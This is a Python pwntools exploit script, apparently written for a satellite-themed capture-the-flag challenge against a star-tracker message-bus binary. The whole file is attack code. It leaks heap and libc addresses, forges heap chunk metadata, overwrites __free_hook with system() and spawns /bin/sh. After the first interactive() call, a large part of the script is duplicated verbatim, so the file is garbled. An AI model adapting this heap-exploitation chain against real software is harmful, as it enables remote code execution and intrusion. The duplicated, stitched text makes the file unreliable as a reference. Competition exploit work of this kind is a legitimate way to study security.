#!/usr/bin/env python3
from pwn import *


if args.REMOTE:
    p = remote("magic.quals2023-kah5Aiv9.satellitesabove.me", 5300)
elif args.RR:
    p = process(["rr", "record", "./warning"])
else:
    p = process("./magic", aslr=True)


if args.REMOTE:
    p.sendline(
        "[REDACTED]"
    )

TEST_MSG = 100
GET_STARS = 101
NUM_STARS = 102
BRIGHTEST_STARS = 103
RESET = 104
CALIBRATE = 105
QUATERNION = 106


def post_message(msg_id: int, pipe_id: int, is_hex: bool, msg: bytes):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("msg_id: ", f"{msg_id}".encode())
    p.sendlineafter("pipe_id: ", f"{pipe_id}".encode())
    p.sendlineafter("hex: ", f"{1 if is_hex else 0}".encode())
    p.sendlineafter("Message to post on bus: ", msg)


def handle_startracker_1_messages():
    p.sendlineafter("> ", b"2")


def handle_startracker_2_messages():
    p.sendlineafter("> ", b"3")


def exit_menu():
    p.sendlineafter("> ", b"4")


post_message(TEST_MSG, 0x0, True, b"P" * (0x61))

handle_startracker_1_messages()
p.recvuntil(b"StarTracker: Testing Message")
p.recvline()
data = p.recvline()
leak = b"".join([p8(int(x, 16)) for x in data.split(b" ")[:-1]])
heap_leak = u64(leak[80:][:8])

print(hex(heap_leak))
# p.interactive()
offset_from_leak = 0x24c0
fd = heap_leak+offset_from_leak
bk = heap_leak+offset_from_leak
fd_nextsize = heap_leak+offset_from_leak
bk_nextsize = heap_leak+offset_from_leak
fake_fd = heap_leak+offset_from_leak
fake_bk = heap_leak+offset_from_leak
fake_fd_nextsize = heap_leak+offset_from_leak
fake_bk_nextsize = heap_leak+offset_from_leak
for i in range(2):
    post_message(
        TEST_MSG,
        0xFF,
        False,
        flat(
            {
                0xD50+0xd0: p64(0x790),
                0xD58+0xd0: p64(0x420),
                0xD60+0xd0: p64(fd),
                0xD68+0xd0: p64(bk),
                0xD70+0xd0: p64(fd_nextsize),
                0xD78+0xd0: p64(bk_nextsize),
                0xD80+0xd0: p64(fake_fd),
                0xD88+0xd0: p64(fake_bk),
                0xD90+0xd0: p64(fake_fd_nextsize),
                0xD98+0xd0: p64(fake_bk_nextsize),
            },
            length=0xF11,
        ),
    )

for _ in range(2):
    handle_startracker_1_messages()

post_message(TEST_MSG, 0xFF, True, b"P" * (0xc1))

handle_startracker_1_messages()
p.recvuntil(b"StarTracker: Testing Message")
p.recvline()
data = p.recvline()
leak = b"".join([p8(int(x, 16)) for x in data.split(b" ")[:-1]])

libc_addr = u64(leak[120:][:8]) - 0x1ECBE0
print(hex(libc_addr))

post_message(TEST_MSG, 0x1, False, p64(0x0) * (0xF0 // 8))
post_message(TEST_MSG, 0x1, False, p64(0x0) * (0x80 // 8))

for _ in range(7):
    post_message(TEST_MSG, 0xFF, False, b"A" * (0xF0))

handle_startracker_2_messages()

post_message(0x34, 0x34, True, b"0" * (0x10 * 16) + b"20040000" + b"0" * 8 + b"0")

for _ in range(7):
    handle_startracker_1_messages()
    handle_startracker_2_messages()

post_message(
    0x34, 0x34, False, p64(0x41414150) + p64(0x41414150) + b"B" * (0x80 - 0x10)
)

target = libc_addr+0x1eee48  # __free_hook

post_message(
    TEST_MSG,
    0x1,
    False,
    p64(0x790) * 0x2F + p64(0x101) + p64(target) * ((0x510 // 8) - 0x30),
)

post_message(TEST_MSG, 0x1, False, b"K" * (0xF0))
system_addr = libc_addr + 0x52290
post_message(TEST_MSG, 0x1, False, p64(system_addr) * (0xF0 // 8))

post_message(0x34, 0x34, False, b"/bin/sh")

p.interactive()
fd = heap_leak+offset_from_leak
bk = heap_leak+offset_from_leak
fd_nextsize = heap_leak+offset_from_leak
bk_nextsize = heap_leak+offset_from_leak
fake_fd = heap_leak+offset_from_leak
fake_bk = heap_leak+offset_from_leak
fake_fd_nextsize = heap_leak+offset_from_leak
fake_bk_nextsize = heap_leak+offset_from_leak
for i in range(2):
    post_message(
        TEST_MSG,
        0xFF,
        False,
        flat(
            {
                0xD50+0xd0: p64(0x790),
                0xD58+0xd0: p64(0x420),
                0xD60+0xd0: p64(fd),
                0xD68+0xd0: p64(bk),
                0xD70+0xd0: p64(fd_nextsize),
                0xD78+0xd0: p64(bk_nextsize),
                0xD80+0xd0: p64(fake_fd),
                0xD88+0xd0: p64(fake_bk),
                0xD90+0xd0: p64(fake_fd_nextsize),
                0xD98+0xd0: p64(fake_bk_nextsize),
            },
            length=0xF11,
        ),
    )

for _ in range(2):
    handle_startracker_1_messages()

post_message(TEST_MSG, 0xFF, True, b"P" * (0xc1))

handle_startracker_1_messages()
p.recvuntil(b"StarTracker: Testing Message")
p.recvline()
data = p.recvline()
leak = b"".join([p8(int(x, 16)) for x in data.split(b" ")[:-1]])

libc_addr = u64(leak[120:][:8]) - 0x1ECBE0
print(hex(libc_addr))

post_message(TEST_MSG, 0x1, False, p64(0x0) * (0xF0 // 8))
post_message(TEST_MSG, 0x1, False, p64(0x0) * (0x80 // 8))

for _ in range(7):
    post_message(TEST_MSG, 0xFF, False, b"A" * (0xF0))

handle_startracker_2_messages()

post_message(0x34, 0x34, True, b"0" * (0x10 * 16) + b"20040000" + b"0" * 8 + b"0")

for _ in range(7):
    handle_startracker_1_messages()
    handle_startracker_2_messages()

post_message(
    0x34, 0x34, False, p64(0x41414150) + p64(0x41414150) + b"B" * (0x80 - 0x10)
)

target = libc_addr+0x1eee48  # __free_hook

post_message(
    TEST_MSG,
    0x1,
    False,
    p64(0x790) * 0x2F + p64(0x101) + p64(target) * ((0x510 // 8) - 0x30),
)

post_message(TEST_MSG, 0x1, False, b"K" * (0xF0))
system_addr = libc_addr + 0x52290
post_message(TEST_MSG, 0x1, False, p64(system_addr) * (0xF0 // 8))

post_message(0x34, 0x34, False, b"/bin/sh")

p.interactive()
